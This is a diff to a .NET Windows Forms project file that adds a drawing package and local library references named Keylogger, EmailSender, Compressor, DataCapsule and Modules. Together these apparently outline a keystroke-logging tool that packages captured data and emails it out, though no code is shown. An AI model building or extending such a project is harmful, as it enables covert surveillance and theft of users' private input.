@@ -6,4 +6,26 @@
     <UseWindowsForms>true</UseWindowsForms>
   </PropertyGroup>
 
+  <ItemGroup>
+    <PackageReference Include="System.Drawing.Common" Version="5.0.2" />
+  </ItemGroup>
+
+  <ItemGroup>
+    <Reference Include="Compressor">
+      <HintPath>..\..\..\Compressor\Compressor\Compressor\bin\Debug\netcoreapp3.1\Compressor.dll</HintPath>
+    </Reference>
+    <Reference Include="DataCapsule">
+      <HintPath>..\..\..\Compressor\Compressor\Compressor\bin\Debug\netcoreapp3.1\DataCapsule.dll</HintPath>
+    </Reference>
+    <Reference Include="EmailSender">
+      <HintPath>..\..\..\EmailSender\EmailSender\EmailSender\bin\Debug\netcoreapp3.1\EmailSender.dll</HintPath>
+    </Reference>
+    <Reference Include="Keylogger">
+      <HintPath>..\..\..\Keylogger\Keylogger\Keylogger\bin\Debug\Keylogger.dll</HintPath>
+    </Reference>
+    <Reference Include="Modules">
+      <HintPath>..\..\..\Modules\Modules\Modules\bin\Debug\netcoreapp3.1\Modules.dll</HintPath>
+    </Reference>
+  </ItemGroup>
+
 </Project>
